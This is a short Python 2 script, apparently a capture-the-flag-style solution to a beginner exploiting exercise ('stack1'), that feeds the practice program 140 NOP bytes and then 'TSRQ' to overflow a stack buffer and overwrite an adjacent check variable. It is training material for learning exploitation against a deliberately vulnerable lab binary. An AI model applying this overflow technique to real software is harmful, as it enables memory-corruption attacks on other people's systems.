#Solucion the Stack1 ejercicio 004 by hdbreaker
#http://ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/004%20stack1.idb/Enunciado.txt
import os

# 140 bytes es el largo del Buffer, directamente seguido se encuentra Var_C
# que debe ser pisado con TSRQ (QRST little endian) para que la comparacion se cumplas
stdin,stdout = os.popen4("stack1.exe") 
print stdin
nopsleed = "\x90"*140 # => Buffer length
payload = nopsleed + "TSRQ" + "\n" # => Valid Cookie
print "[#] Sending Payload"
stdin.write(payload)
print stdout.read(1024)
